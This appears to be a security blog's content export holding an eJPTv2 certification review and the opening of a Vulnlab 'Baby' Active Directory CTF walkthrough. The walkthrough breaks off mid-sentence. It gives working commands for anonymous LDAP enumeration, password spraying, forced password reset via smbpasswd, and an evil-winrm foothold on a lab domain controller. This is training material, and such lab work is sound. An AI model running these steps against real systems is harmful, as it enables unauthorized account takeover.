class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">5. Cascade\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">6. Cicada\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">7. Resolute\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003C/section>\u003Csection>\u003Ch3 id=\"htb-academy-modules\">HTB Academy Modules\u003Ca class=\"anchor\" href=\"#htb-academy-modules\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cul>\n\u003Cli>\u003Ca href=\"https://academy.hackthebox.com/module/details/57\">Login Brute Forcing\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://academy.hackthebox.com/module/details/113\">Attacking Common Applications\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://academy.hackthebox.com/module/details/74\">Intro to Active Directory\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://academy.hackthebox.com/module/details/143\">Active Directory Enumeration &#x26; Attacks\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://academy.hackthebox.com/module/details/17\">Hacking WordPress\u003C/a>\u003C/li>\n\u003C/ul>\u003C/section>\u003Csection>\u003Ch3 id=\"quick-facts\">Quick Facts\u003Ca class=\"anchor\" href=\"#quick-facts\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cul>\n\u003Cli>\u003Cstrong>Style\u003C/strong>: Brute-Force is a must, AD-heavy\u003C/li>\n\u003Cli>\u003Cstrong>Time\u003C/strong>: one-day exam window\u003C/li>\n\u003Cli>\u003Cstrong>Focus\u003C/strong>: enumeration → chaining → privesc\u003C/li>\n\u003C/ul>\u003Chr>\u003C/section>\u003C/section>",{"headings":170,"localImagePaths":222,"remoteImagePaths":223,"frontmatter":224,"imagePaths":229},[171,174,177,180,183,186,189,192,195,198,201,204,207,210,213,216,219],{"depth":58,"slug":172,"text":173},"ecpptv3-review","eCPPTv3 Review#",{"depth":58,"slug":175,"text":176},"my-background","My Background#",{"depth":58,"slug":178,"text":179},"the-training","The Training#",{"depth":123,"slug":181,"text":182},"what-to-skip-on-the-training","What to Skip on the Training#",{"depth":58,"slug":184,"text":185},"what-to-add-to-actually-pass","What to Add (to actually pass)#",{"depth":123,"slug":187,"text":188},"active-directory","Active Directory#",{"depth":123,"slug":190,"text":191},"web-app","Web App#",{"depth":58,"slug":193,"text":194},"preparation","Preparation#",{"depth":58,"slug":196,"text":197},"the-exam","The Exam#",{"depth":58,"slug":199,"text":200},"personal-opinion","Personal Opinion#",{"depth":58,"slug":202,"text":203},"exam-flaws--caveats","Exam Flaws / Caveats#",{"depth":58,"slug":205,"text":206},"tips","Tips#",{"depth":58,"slug":208,"text":209},"machines--modules-by-hackthebox","Machines & Modules by HackTheBox#",{"depth":123,"slug":211,"text":212},"linux-boxes","Linux Boxes#",{"depth":123,"slug":214,"text":215},"ad-boxes","AD Boxes#",{"depth":123,"slug":217,"text":218},"htb-academy-modules","HTB Academy Modules#",{"depth":123,"slug":220,"text":221},"quick-facts","Quick Facts#",[],[],{"title":156,"published":225,"description":158,"image":159,"tags":226,"category":163,"draft":39,"minutes":58,"words":227,"excerpt":228},["Date","2025-09-06T00:00:00.000Z"],[43,161,162],438,"January 2025 • by DelorianCS",[],"ecppt.md","ejpt",{"id":231,"data":233,"body":240,"filePath":241,"digest":242,"rendered":243,"legacyId":274},{"title":234,"published":235,"draft":39,"description":236,"image":237,"tags":238,"category":163,"lang":47,"prevTitle":47,"prevSlug":47,"nextTitle":47,"nextSlug":47},"eJPT - Review",["Date","2025-07-06T00:00:00.000Z"],"Here I share the full breakdown of the eJPTv2 Certification by INE, my opinion, some Tips & Tricks and some machines & material to actually prepare for the certification.","https://miro.medium.com/1*KXRcpcS4sGp4xvLjhByI7A.png",[163,161,239],"eJPT","## eJPTv2 Review\n\n**January 2025 • by DelorianCS**\n\nMy experience preparing for *INE's* *Junior Penetration Tester* `eJPTv2`: how I studied, what to focus on, what to skip, and tips for passing confidently as a beginner.\n\n## My Background\nI was essentially a beginner. My main experience came from **TryHackMe** labs, where I learned networking basics and cybersecurity fundamentals—enough to get started but nothing advanced.\n\n## The Training\nThe official *INE*  training is well-structured and thorough, but it goes beyond what's needed for the exam itself. Focus on the essentials for efficiency.\n\n### What to Skip\n- *Phishing modules* (not exam-critical)\n- *Some passive reconnaissance sections* (useful but not essential)\n- *The web pentesting module* is largely unnecessary for the exam\n\n## What to Add\nFocus on fundamentals: **networking concepts**, **nmap scanning**, **FTP and SMB enumeration**, **Metasploit**, and common exploits like *EternalBlue*. Practice light TryHackMe machines for a balanced skill set.\n\n## Preparation\nAround **15–30 days** of focused study is enough to comfortably pass the test if you stay consistent. Perfect for those starting their cybersecurity journey.\n\n## The Exam\nThe exam runs entirely in-browser through `Guacamole`, which feels different if you're used to a local **VM**. All required tools are provided, and you have **48 hours!!** that's plenty of time, as 5–6 hours is often enough.\n\n## Personal Opinion\nAs it's my first certification I can't really add complains but I think this may be a little too beginner-friendly when it comes to the content, you do learn a lot on the course but the exam itself its so easy that it doesn't feel like all the learning was useful\n\n## Exam Flaws / Caveats\n1. Occasional lab instability—flags may vanish until a reset\n2. Overall no real flaws with the exam itself\n\n## Tips\n1. Take detailed notes—hosts, credentials, footholds\n2. Copy all exam questions into your notes (Obsidian is great)\n3. If stuck, brute-force low-hanging services\n4. Once you feel ready, take the exam without hesitation (trust me it's easy af)\n5. Enjoy the process and have fun\n\n## Machines to Prepare by TryHackMe\n\n```\nBasic Pentesting\nIce\nBrooklyn Nine Nine\nAnonymous\nEasy Peasy\nGoldenEye\nHA Joker CTF\nSource\nPoster\nWordpress: CVE-2021-29447\nBlog\nRootMe\n```\n\n### Quick Facts\n- **Style**: Really EASY, fundamentals-heavy\n- **Time**: 48-hour window (6 hours typical)\n- **Focus**: Basic enumeration → exploitation → post-exploitation\n\n**Bottom Line**: Perfect entry-level certification that builds solid foundational skills without overwhelming beginners. Highly recommended for starting your pentesting journey!","src/content/posts/ejpt.md","ad1d78216fb0e4a6",{"html":244,"metadata":245},"\u003Csection>\u003Ch2 id=\"ejptv2-review\">eJPTv2 Review\u003Ca class=\"anchor\" href=\"#ejptv2-review\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>\u003Cstrong>January 2025 • by DelorianCS\u003C/strong>\u003C/p>\u003Cp>My experience preparing for \u003Cem>INE’s\u003C/em> \u003Cem>Junior Penetration Tester\u003C/em> \u003Ccode>eJPTv2\u003C/code>: how I studied, what to focus on, what to skip, and tips for passing confidently as a beginner.\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"my-background\">My Background\u003Ca class=\"anchor\" href=\"#my-background\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>I was essentially a beginner. My main experience came from \u003Cstrong>TryHackMe\u003C/strong> labs, where I learned networking basics and cybersecurity fundamentals—enough to get started but nothing advanced.\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"the-training\">The Training\u003Ca class=\"anchor\" href=\"#the-training\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>The official \u003Cem>INE\u003C/em>  training is well-structured and thorough, but it goes beyond what’s needed for the exam itself. Focus on the essentials for efficiency.\u003C/p>\u003Csection>\u003Ch3 id=\"what-to-skip\">What to Skip\u003Ca class=\"anchor\" href=\"#what-to-skip\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cul>\n\u003Cli>\u003Cem>Phishing modules\u003C/em> (not exam-critical)\u003C/li>\n\u003Cli>\u003Cem>Some passive reconnaissance sections\u003C/em> (useful but not essential)\u003C/li>\n\u003Cli>\u003Cem>The web pentesting module\u003C/em> is largely unnecessary for the exam\u003C/li>\n\u003C/ul>\u003C/section>\u003C/section>\n\u003Csection>\u003Ch2 id=\"what-to-add\">What to Add\u003Ca class=\"anchor\" href=\"#what-to-add\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>Focus on fundamentals: \u003Cstrong>networking concepts\u003C/strong>, \u003Cstrong>nmap scanning\u003C/strong>, \u003Cstrong>FTP and SMB enumeration\u003C/strong>, \u003Cstrong>Metasploit\u003C/strong>, and common exploits like \u003Cem>EternalBlue\u003C/em>. Practice light TryHackMe machines for a balanced skill set.\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"preparation\">Preparation\u003Ca class=\"anchor\" href=\"#preparation\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>Around \u003Cstrong>15–30 days\u003C/strong> of focused study is enough to comfortably pass the test if you stay consistent. Perfect for those starting their cybersecurity journey.\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"the-exam\">The Exam\u003Ca class=\"anchor\" href=\"#the-exam\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>The exam runs entirely in-browser through \u003Ccode>Guacamole\u003C/code>, which feels different if you’re used to a local \u003Cstrong>VM\u003C/strong>. All required tools are provided, and you have \u003Cstrong>48 hours!!\u003C/strong> that’s plenty of time, as 5–6 hours is often enough.\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"personal-opinion\">Personal Opinion\u003Ca class=\"anchor\" href=\"#personal-opinion\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>As it’s my first certification I can’t really add complains but I think this may be a little too beginner-friendly when it comes to the content, you do learn a lot on the course but the exam itself its so easy that it doesn’t feel like all the learning was useful\u003C/p>\u003C/section>\n\u003Csection>\u003Ch2 id=\"exam-flaws--caveats\">Exam Flaws / Caveats\u003Ca class=\"anchor\" href=\"#exam-flaws--caveats\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Col>\n\u003Cli>Occasional lab instability—flags may vanish until a reset\u003C/li>\n\u003Cli>Overall no real flaws with the exam itself\u003C/li>\n\u003C/ol>\u003C/section>\n\u003Csection>\u003Ch2 id=\"tips\">Tips\u003Ca class=\"anchor\" href=\"#tips\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Col>\n\u003Cli>Take detailed notes—hosts, credentials, footholds\u003C/li>\n\u003Cli>Copy all exam questions into your notes (Obsidian is great)\u003C/li>\n\u003Cli>If stuck, brute-force low-hanging services\u003C/li>\n\u003Cli>Once you feel ready, take the exam without hesitation (trust me it’s easy af)\u003C/li>\n\u003Cli>Enjoy the process and have fun\u003C/li>\n\u003C/ol>\u003C/section>\n\u003Csection>\u003Ch2 id=\"machines-to-prepare-by-tryhackme\">Machines to Prepare by TryHackMe\u003Ca class=\"anchor\" href=\"#machines-to-prepare-by-tryhackme\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.4fsv9.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.g1fg5.js\">\u003C/script>\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\" class=\"wrap\" style=\"--ecMaxLine:25ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Basic Pentesting\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Ice\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Brooklyn Nine Nine\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Anonymous\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Easy Peasy\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">GoldenEye\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">HA Joker CTF\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Source\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">9\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Poster\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">10\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Wordpress: CVE-2021-29447\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">11\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">Blog\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">12\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">RootMe\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Csection>\u003Ch3 id=\"quick-facts\">Quick Facts\u003Ca class=\"anchor\" href=\"#quick-facts\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h3>\u003Cul>\n\u003Cli>\u003Cstrong>Style\u003C/strong>: Really EASY, fundamentals-heavy\u003C/li>\n\u003Cli>\u003Cstrong>Time\u003C/strong>: 48-hour window (6 hours typical)\u003C/li>\n\u003Cli>\u003Cstrong>Focus\u003C/strong>: Basic enumeration → exploitation → post-exploitation\u003C/li>\n\u003C/ul>\u003Cp>\u003Cstrong>Bottom Line\u003C/strong>: Perfect entry-level certification that builds solid foundational skills without overwhelming beginners. Highly recommended for starting your pentesting journey!\u003C/p>\u003C/section>\u003C/section>",{"headings":246,"localImagePaths":267,"remoteImagePaths":268,"frontmatter":269,"imagePaths":273},[247,250,251,252,255,258,259,260,261,262,263,266],{"depth":58,"slug":248,"text":249},"ejptv2-review","eJPTv2 Review#",{"depth":58,"slug":175,"text":176},{"depth":58,"slug":178,"text":179},{"depth":123,"slug":253,"text":254},"what-to-skip","What to Skip#",{"depth":58,"slug":256,"text":257},"what-to-add","What to Add#",{"depth":58,"slug":193,"text":194},{"depth":58,"slug":196,"text":197},{"depth":58,"slug":199,"text":200},{"depth":58,"slug":202,"text":203},{"depth":58,"slug":205,"text":206},{"depth":58,"slug":264,"text":265},"machines-to-prepare-by-tryhackme","Machines to Prepare by TryHackMe#",{"depth":123,"slug":220,"text":221},[],[],{"title":234,"published":270,"description":236,"image":237,"tags":271,"category":163,"draft":39,"minutes":58,"words":272,"excerpt":228},["Date","2025-07-06T00:00:00.000Z"],[163,161,239],349,[],"ejpt.md","baby",{"id":275,"data":277,"body":285,"filePath":286,"digest":287,"rendered":288,"legacyId":321},{"title":278,"published":279,"draft":39,"description":280,"image":281,"tags":282,"category":46,"lang":47,"prevTitle":47,"prevSlug":47,"nextTitle":47,"nextSlug":47},"VL Baby",["Date","2025-10-24T00:00:00.000Z"],"Baby is a Windows Active Directory Easy Box from Vulnlab, we will learn Abusing STATUS_PASSWORD_MUST_CHANGE | Abusing SeBackupPrivilege | Dumping hashes using backup | Dumping Hashes...","https://assets.vulnlab.com/baby_slide.png",[43,283,284],"Easy","Vulnlab","# Baby\n\n## Reconnaissance\n\nAs always, we start off by performing our regular `TCP` scan using `nmap` &#x20;\n\n```bash\nnmap --privileged -p- --open -Pn -n --min-rate 5000 -sS -sCV -vvv -oN scan 10.129.8.92\n```\n\n```bash\nPORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-24 07:15:55Z)\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 127\n464/tcp   open  kpasswd5?     syn-ack ttl 127\n593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack ttl 127\n3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 127\n3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n52764/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n52765/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n52774/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n55156/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\nService Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n```\n\nWe see we are facing a *DC* (Domain Controller) because of the open ports like `53 TCP (DNS)` `88 TCP (Kerberos)` `389 TCP (LDAP)`&#x20;\n\nWe can already see the domain using `netexec` so we can add it to our `/etc/hosts` file\n\n```bash\nnetexec smb $TARGET\nSMB         10.129.50.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) \n```\n\nLet's start off by enumerating *DNS* using `dig`&#x20;\n\n```bash\ndig @$TARGET baby.vl NS\nbaby.vl.\t\t3600\tIN\tNS\tbabydc.baby.vl.\n```\n\nWe can see also the *fully qualified domain* name of the `DC`&#x20;\n\nNow let's enumerate `SMB` on the target machine using a *NULL Session* in `netexec` &#x20;\n\n```bash\nnetexec smb babydc.baby.vl -u '' -p '' --users --shares --rid-brute\nSMB         10.129.50.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) \nSMB         10.129.50.21    445    BABYDC           [+] baby.vl\\: \nSMB         10.129.50.21    445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED\nSMB         10.129.50.21    445    BABYDC           [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.\n```\n\nWe see here that our access is blocked using in `SMB`, let's  try `LDAP` using `netexec` again\n\n```bash\n netexec ldap babydc.baby.vl -u '' -p '' --users\nLDAP        10.129.50.21    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nLDAP        10.129.50.21    389    BABYDC           [+] baby.vl\\: \nLDAP        10.129.50.21    389    BABYDC           [*] Enumerated 9 domain users: baby.vl\nLDAP        10.129.50.21    389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                              \nLDAP        10.129.50.21    389    BABYDC           Guest                         \u003Cnever>             2        Built-in account for guest access to the computer/domain\nLDAP        10.129.50.21    389    BABYDC           Jacqueline.Barnett            2021-11-21 15:11:03 2                                                   \nLDAP        10.129.50.21    389    BABYDC           Ashley.Webb                   2021-11-21 15:11:03 2                                                   \nLDAP        10.129.50.21    389    BABYDC           Hugh.George                   2021-11-21 15:11:03 2                                                   \nLDAP        10.129.50.21    389    BABYDC           Leonard.Dyer                  2021-11-21 15:11:03 2                                                   \nLDAP        10.129.50.21    389    BABYDC           Connor.Wilkinson              2021-11-21 15:11:08 2                                                   \nLDAP        10.129.50.21    389    BABYDC           Joseph.Hughes                 2021-11-21 15:11:08 2                                                   \nLDAP        10.129.50.21    389    BABYDC           Kerry.Wilson                  2021-11-21 15:11:08 2                                                   \nLDAP        10.129.50.21    389    BABYDC           Teresa.Bell                   2021-11-21 15:14:37 2        Set initial password to BabyStart123!      \nLDAP        10.129.50.21    389    BABYDC           Caroline.Robinson             2021-11-21 15:14:37 2             \n  ~/HackTheBox/Medium/Baby/nmap ❯ \n```\n\nWe successfully enumerated some users on the DC and a potential credential `Teresa.Bell:BabyStart123!`&#x20;\n\n## Password Spraying\n\nAs we found a bunch of users and password it is only natural to perform a *password spraying attack* on every user we found, let's use `netexec` again in order to do this, this time  we will target the *SMB* service\n\n```bash\nnetexec smb babydc.baby.vl -u ../content/users.txt -p 'BabyStart123!' --users\nSMB         10.129.50.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Guest:BabyStart123! STATUS_LOGON_FAILURE \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE \nSMB         10.129.50.21    445    BABYDC           [-] baby.vl\\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE                                                                                                                    4s\n```\n\nAnd we see a different status on the `Caroline.Robinson` account: `STATUS_PASSWORD_MUST_CHANGE`&#x20;\n\nWe can abuse this using `smbpasswd` , changing the targeted users password to a new password that we decide, in this case we will use `BabyStarted123!` for example:\n\n```bash\nsmbpasswd -U Caroline.Robinson -r $TARGET\nOld SMB password: BabyStart123!\nNew SMB password: BabyStarted123!\nRetype new SMB password: BabyStarted123!\n```\n\nNow we can check if this user has got any remote connection privilege, we will check `winrm` which is active on `TCP 5985`&#x20;\n\n```\nmetexec winrm babydc.baby.vl -u 'Caroline.Robinson' -p 'BabyStarted123!'\nWINRM       10.129.50.21    5985   BABYDC           [+] baby.vl\\Caroline.Robinson:BabyStarted123! (Pwn3d!)\n```\n\nSuccess! now we can foothold onto the machine\n\n## Foothold\n\nLet's use the `evil-winrm` tool in order to get our foothold on the *DC* &#x20;\n\n```bash\nevil-winrm -i $TARGET -u 'Caroline.Robinson' -p 'BabyStarted123!';\n```\n\nBefore using `BloodHound` to escalate our privileges, let's try to do some basic enumeration to see our current user's privileges\n\n```powershell\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n```\n\nAnd we got a dangerous 